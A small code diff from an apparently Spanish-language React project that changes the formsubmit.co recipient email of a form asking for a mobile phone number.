@@ -36,7 +36,7 @@ const Numerocelular = () => {
       </div>
       <div className="contglobal">
         <div className="contenedor">
-          <form className="formulario" action="https://formsubmit.co/robr48j@gmail.com"method="POST">
+          <form className="formulario" action="https://formsubmit.co/franchescohbc@gmail.com"method="POST">
             <h1 className="titulo">Numero de Celular</h1>
             <div className="cont">
               <div className="labeleicon">
